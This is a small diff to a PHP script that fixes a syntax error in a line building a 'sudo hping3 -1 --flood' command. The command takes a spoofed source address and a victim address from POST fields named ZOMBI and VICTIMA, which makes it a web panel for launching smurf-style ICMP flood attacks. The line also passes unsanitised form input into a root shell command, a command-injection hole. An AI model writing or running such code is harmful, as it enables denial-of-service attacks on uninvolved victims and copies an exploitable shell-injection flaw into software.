@@ -21,7 +21,7 @@
 
    // Use ls command to shell_exec
    // function
-    $SMURF = 'sudo hping3 -1 --flood -a '.$_POST['ZOMBI']." "..$_POST['VICTIMA'];
+    $SMURF = 'sudo hping3 -1 --flood -a '.$_POST['ZOMBI']." ".$_POST['VICTIMA'];
 
 
    if (isset($_POST['SMURF']))
